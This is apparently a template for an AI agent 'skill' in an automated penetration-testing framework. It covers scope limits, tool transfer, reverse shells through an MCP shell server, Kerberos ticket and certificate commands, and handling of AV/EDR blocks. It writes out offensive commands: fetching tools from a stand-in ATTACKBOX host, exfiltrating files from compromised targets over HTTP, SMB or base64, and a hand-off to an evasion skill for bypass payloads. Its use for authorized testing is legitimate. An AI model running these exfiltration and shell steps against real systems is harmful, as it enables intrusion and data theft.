---
name: <skill-name>
description: >
  <What this skill does in 2-3 sentences. Focus on technique scope and when
  to use it. No trigger phrases, negative conditions, or OPSEC details here.>
keywords:
  - <operator search term>
  - <technique name or acronym>
  - <tool name that implies this technique>
tools:
  - <tool1>
  - <tool2>
opsec: <low|medium|high>
---

# <Skill Display Name>

You are helping a penetration tester with <technique description>. All testing
is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[<skill-name>] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## Scope Boundary

This skill covers <scope>. When you reach the boundary of this scope — whether
through a routing instruction ("Route to **skill-name**") or by discovering
findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Recommended next skill (the bold **skill-name** from routing instructions)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Web Interaction

When interacting with web applications, use the browser MCP tools as the
default for navigating sites, filling forms, and managing sessions. Browser
tools handle CSRF tokens, session cookies, JavaScript-rendered content, and
multi-step flows that curl cannot.

- **Browser tools** (default) — navigate pages, fill forms, manage sessions,
  take screenshots for evidence, execute JavaScript for DOM inspection
- **curl** (fallback) — crafted payloads needing precise header/body control,
  injection testing where exact request structure matters
- **Injection-focused skills** may use curl directly for payload delivery when
  the browser adds unwanted encoding or headers

## File Exfiltration

When retrieving files from a compromised target (loot, backups, configs,
databases), prefer direct download over encoding. Choose the first method
that works:

1. **Web-accessible** (file in webroot, served by HTTP/HTTPS)?
   → `curl`/`wget` from attackbox. Fastest and cleanest.
2. **SSH/SCP access available?**
   → `scp user@target:/path/file ./engagement/evidence/`
3. **Target can reach attackbox** (outbound HTTP)?
   → Target: `python3 -m http.server 8080` from the file's directory
   → Attackbox: `curl http://TARGET:8080/file -o evidence/file`
4. **SMB available?**
   → Attackbox: `impacket-smbserver share ./evidence -smb2support`
   → Target: `copy file \\ATTACKBOX\share\file`
5. **Last resort** (air-gapped, no outbound, no writable shares):
   → `base64 file | tr -d '\n'` on target, paste on attackbox, decode
   → Only for small files (<50KB)

**Never default to base64 when a download method exists.** Base64 is slow,
error-prone on large files, and produces unreadable blobs in shell transcripts.

## Shell Access (when RCE is achieved)

When this skill achieves command execution on a target, **prefer establishing a
reverse shell via the MCP shell-server** over continuing to inject commands
inline (webshell, command injection parameter, SQL xp_cmdshell, etc.).

1. Call `start_listener(port=<port>)` to prepare a catcher
2. Send a reverse shell payload through the current access method
3. Call `list_sessions()` to verify the connection
4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
5. Use `send_command(session_id=..., command=...)` for subsequent commands

**After stabilizing the shell**, proceed to the Escalate or Pivot section.
Do not begin host enumeration or privilege escalation — that is the discovery
skill's job.

**Why**: Interactive shells are more reliable, faster, and required for
privilege escalation tools that spawn new shells (PwnKit, kernel exploits,
sudo abuse). Webshell/injection-based command execution is fragile, slow,
and loses output from interactive programs.

**Exception**: If the target has no outbound connectivity (firewall blocks
reverse connections), fall back to inline command execution and note the
limitation in your return summary.

## Prerequisites

- <Required access level or position>
- <Required tools (with install note)>
- <Conditions that must be true>

### Tool output directory

Several tools write output files to CWD with no output-path flag
(`getTGT.py` → `<user>.ccache`, `certipy req` → `<user>.pfx`,
`certipy auth` → `<user>.ccache`, `bloodyAD add shadowCredentials` →
`<user>_*.pfx`). To avoid scattering files in the working directory:

```bash
# Always prefix CWD-writing commands with cd $TMPDIR
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH
export KRB5CCNAME=$TMPDIR/user.ccache

cd $TMPDIR && certipy req -k -no-pass -dc-ip DC_IP -ca 'CA' -template Tpl
cd $TMPDIR && certipy auth -pfx $TMPDIR/user.pfx -dc-ip DC_IP

# Save evidence with mv (not cp) to avoid stray duplicates
mv $TMPDIR/user.pfx engagement/evidence/user.pfx
mv $TMPDIR/user.ccache engagement/evidence/user.ccache
```

**Note**: `getTGT.py` does NOT support `-out`. It always writes
`<user>.ccache` to CWD. The `cd $TMPDIR &&` prefix is the only control.

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. <Key info needed>
2. <Key info needed>
3. <Key info needed>

Skip if context was already provided.

## Step 2: Confirm Vulnerability

<How to verify the technique applies. Embedded test payloads.>

## Step 3: Exploit

### Variant A: <Description>

```bash
# Explanation of what this does
command arg1 arg2
```

### Variant B: <Description>

```bash
# Alternative when Variant A fails or is blocked
command arg1 arg2
```

## Step N: Escalate or Pivot

After completing this technique:
- <Outcome 1>: STOP. Return to orchestrator recommending **<other-skill-name>**. Pass: <context>.
- <Outcome 2>: STOP. Return to orchestrator recommending **<other-skill-name>**. Pass: <context>.
- <Outcome 3>: Summarize findings, suggest next steps

When routing, always pass along: injection point, target technology, current
mode, and any payloads that already succeeded.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)

## AV/EDR Detection

If a payload or tool is caught by antivirus or EDR — **do not retry with
a different msfvenom flag or trivial modification. That is not progress.**

### Recognition Signals

- **File vanishes**: Payload written to disk but gone seconds later (quarantined)
- **Access denied on execution**: File exists but OS blocks execution
- **Immediate process termination**: Process starts then dies within 1-2 seconds
- **Defender notification**: "Windows Defender Antivirus has found threats"
- **Error messages**: "Operation did not complete successfully because the file
  contains a virus or potentially unwanted software"
- **CrowdStrike/EDR kill**: Process killed with no output, or
  "This program has been blocked by your administrator"

### What to Do

1. **Stop immediately** — do not retry the same payload type
2. **Note what was caught**: payload type (DLL/EXE/script), generation method
   (msfvenom, pre-compiled tool, custom), and exact error/behavior
3. **Return to orchestrator** with structured AV-blocked context:

**Return format for AV-blocked exit:**
```
### AV/EDR Blocked
- Payload: <what was attempted> (e.g., "msfvenom x64 DLL reverse shell")
- Detection: <what happened> (e.g., "file quarantined within 2 seconds of write")
- AV product: <if known> (e.g., "Windows Defender", "CrowdStrike")
- Technique: <what exploit needs the payload> (e.g., "DnsAdmins DLL injection")
- Payload requirements: <what the exploit needs> (e.g., "x64 DLL with DllMain entry point")
- Target OS: <version>
- Current access: <user and method>
```

The orchestrator will route to **av-edr-evasion** to build a bypass payload,
then re-invoke this skill with the AV-safe artifact.

## DNS Resolution Failure

If a tool fails because a hostname cannot be resolved — **do not retry,
do not fall back to IP-only, do not attempt to modify /etc/hosts.**

### Recognition Signals

- `Could not resolve host`, `Name or service not known`
- `NXDOMAIN`, `Server can't find <hostname>`
- Kerberos errors with hostname resolution context
- Tool hangs on DNS lookup then times out
- `getaddrinfo failed`, `nodename nor servname provided`

### What to Do

1. **Stop immediately** — do not retry the same tool
2. **Note which hostname(s) failed** and what tool was being used
3. **Return to orchestrator** with DNS resolution context:

**Return format for DNS failure:**
```
### DNS Resolution Failure
- Hostname: <what couldn't be resolved> (e.g., "megabank.local")
- Tool: <what failed> (e.g., "nxc ldap megabank.local")
- Error: <exact error message>
- Target IP: <IP that hostname should resolve to, if known>
```

The orchestrator will pause the engagement and request the operator to
update /etc/hosts, then re-invoke this skill.

## Troubleshooting

### <Common Problem>
<Solution>
